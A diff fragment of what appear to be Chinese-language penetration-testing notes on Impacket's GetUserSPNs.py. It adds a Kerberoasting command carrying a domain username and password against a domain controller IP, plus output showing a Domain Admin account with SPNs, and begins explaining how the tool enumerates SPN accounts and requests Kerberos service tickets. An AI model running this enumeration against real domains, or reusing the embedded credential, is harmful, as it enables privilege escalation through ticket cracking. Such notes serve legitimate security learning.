@@ -1,3 +1,18 @@
+
+```
+ GetUserSPNs.py corp.local/dark:_QuejVudId6 -dc-ip  10.80.179.69
+
+```
+
+Impacket v0.14.0.dev0+20251204.163933.2347bd3f - Copyright Fortra, LLC and its affiliated companies
+
+ServicePrincipalName  Name  MemberOf                                    PasswordLastSet             LastLogon                   Delegation
+--------------------  ----  ------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/fela             fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2025-12-27 15:12:00.971287
+HOST/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2025-12-27 15:12:00.971287
+HTTP/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2025-12-27 15:12:00.971287
+
+
 **getUserSPNs（Impacket）** 是一个常见的安全工具/脚本，用于与 Active Directory/Kerberos 交互，**枚举具有服务主体名称（SPN）Service Principal Name 的帐户**并尝试获取对应的 Kerberos 服务票据（TGS）**Ticket-Granting Service** 的缩写，即 **Kerberos 服务票据颁发服务**。
 1. **枚举含 SPN 的账户**：查询目录以找出所有已注册 SPN 的账户（通常是服务/应用账户）。
     
